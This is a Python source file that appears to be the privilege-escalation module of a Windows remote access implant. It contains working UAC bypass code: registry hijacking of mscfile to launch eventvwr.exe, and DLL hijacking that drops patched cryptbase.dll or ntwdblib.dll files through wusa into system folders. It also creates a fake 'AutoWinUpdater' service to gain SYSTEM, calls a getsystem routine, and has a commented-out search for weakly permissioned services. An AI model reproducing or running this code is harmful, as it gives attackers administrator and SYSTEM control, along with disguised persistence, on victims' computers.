import helpers
from defines import *
import helpers, privilege_escalation, migration, persistence, communication, intel, interact, execute, mutex, pupy_privesc
 
# Functions related to escalating privileges.
 
def bypass_UAC(): #Will automate bypassing UAC in the future
    out = ""
    bitness = helpers.arch()
    version = helpers.version()
    uac_enabled =  True if execute.execute_command("REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin").split()[3] == "0x5" else False
    user_is_admin = helpers.is_user_in_group(helpers.name_of_admin_group(),win32api.GetUserName())
     
    if helpers.is_admin():
        return "[*]You already have admin privileges!"
         
    if not user_is_admin:
        return "[-]Current user is not part of admin group."
         
    if not uac_enabled:
        return "[-]UAC is disabled or notification policy is set to 'Always'"
     
    communication.status("[*]Attempting fileless bypass.")
     
    try:
        print execute.execute_command('REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /d "'+EXECUTABLE_PATH+' --chdir '+os.getcwd()+' --welcome_msg """[+]UAC bypassed successfully!"""" /f')
        os.startfile("eventvwr.exe")
        if not migration.handler_confirmation():
            raise Exception("[-]Fileless bypass failed.")
        execute.execute_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f")
        sock.close()
        sys.exit(0)
    except Exception as e:
        communication.status(str(e))
         
    return False
     
    communication.status("[*]Attempting dll hijacking based bypass.")
     
    try:
        if version == "7":
            with open(UAC_DLL,"rb") as r:
                data = r.read()
                num = data.count('K')
                data = data.replace("K"*num, str(EXECUTABLE_PATH).ljust(num,"."))
                with open("cryptbase.dll","wb") as w:
                    w.write(data)
            execute.execute_command("makecab cryptbase.dll cryptbase.tmp")
            execute.execute_command("wusa "+os.path.abspath("cryptbase.tmp")+" /extract:C:\\Windows\\ehome")
            os.remove("cryptbase.dll")
            os.remove("cryptbase.tmp")
            os.startfile("C:\\Windows\\ehome\\mcx2prov.exe")
             
        elif version == "8":
            with open(UAC_DLL,"rb") as r:
                data = r.read()
                num = data.count('K')
                data = data.replace("K"*num, str(EXECUTABLE_PATH).ljust(num,"."))
                with open("cryptbase.dll","wb") as w:
                    w.write(data)
            execute.execute_command("makecab cryptbase.dll cryptbase.tmp")
            execute.execute_command("wusa "+os.path.abspath("cryptbase.tmp")+" /extract:C:\\windows\\System32\\sysprep")
            os.remove("cryptbase.dll")
            os.remove("cryptbase.tmp")
            os.startfile("C:\\windows\\System32\\sysprep\\sysprep.exe")
             
        elif version == "8.1":
            with open(UAC_DLL,"rb") as r:
                data = r.read()
                num = data.count('K')
                data = data.replace("K"*num, str(EXECUTABLE_PATH).ljust(num,"."))
                with open("ntwdblib.dll","wb") as w:
                    w.write(data)
            execute.execute_command("makecab ntwdblib.dll cryptbase.tmp")
            execute.execute_command("wusa "+os.path.abspath("cryptbase.tmp")+" /extract:C:\\windows\\System32")
            os.remove("ntwdblib.dll")
            os.remove("cryptbase.tmp")
            os.startfile("C:\\windows\\System32\\cliconfg.exe")
             
        else:
            return "Unsupported windows version."
         
        migrate()
        return "[-]Failed to bypass UAC."
    except Exception as e:
        return "Failed to bypass UAC: "+str(e)
         
         
def create_service():
    if helpers.is_admin():
        communication.status("[*]Getting SYSTEM via adding a service.")
        execute.execute_command('sc create AutoWinUpdater start= auto type= own binpath= "'+EXECUTABLE_PATH+'"')
        execute.start_detached('sc start AutoWinUpdater') # Starting detached beacuse sc start hangs for a long time.
        migration.migrate()
    return False
     
     
def get_system(): #Attempts to automatically get system
    for i in range(4):
        try:
            ret = pupy_privesc.getsystem(EXECUTABLE_PATH)
            if ret == True:
                migration.migrate()
            return ret
        except Exception as e:
            return str(e)
         
    """print("execute.execute_commanding 1")
    execute.execute_command('for /f "tokens=2 delims=\'=\'" %a in (\'wmic service list full^|find /i "pathname"^|find /i /v "system32"\') do @echo %a >> p1.txt')
    print("execute.execute_commanding 2")
    execute.execute_command('for /f eol^=^"^ delims^=^" %a in (p1.txt) do cmd.exe /c icacls "%a" /q >> p2.txt')
    print("deling")
    execute.execute_command('del p1.txt')
    services = []
    curserv = ""
    with open("p2.txt","r") as f:
        print("opened file")
        while True:
            line = f.readline()
            print(line)
            if not line: break
            if "Successfully" not in line:
                curserv += line.strip()
            else:
                services.append(curserv)
                curserv = ""
        for service in services:
            print(service+"\n")
        print("finished printing services")
    return "done"""